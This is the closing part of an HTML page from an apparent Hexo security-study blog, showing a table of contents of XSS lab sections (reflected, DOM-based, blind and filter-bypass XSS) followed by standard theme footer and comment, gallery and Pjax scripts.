class="toc-text">Mime Type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-Image-Size"><span class="toc-number">4.3.</span> <span class="toc-text">Get Image Size</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">XSS跨站攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss%EF%BC%88get%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">反射性xss（get）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss%EF%BC%88post%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">反射性xss（post）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">5.3.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">5.4.</span> <span class="toc-text">DOM型xss-x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9B%B2%E6%89%93"><span class="toc-number">5.5.</span> <span class="toc-text">XSS盲打</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%BF%87%E6%BB%A4"><span class="toc-number">5.6.</span> <span class="toc-text">XSS过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-Htmlspecialchars%E8%BF%87%E6%BB%A4"><span class="toc-number">5.7.</span> <span class="toc-text">XSS Htmlspecialchars过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-href%E8%BE%93%E5%87%BA"><span class="toc-number">5.8.</span> <span class="toc-text">XSS href输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-js%E8%BE%93%E5%87%BA"><span class="toc-number">5.9.</span> <span class="toc-text">XSS js输出</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
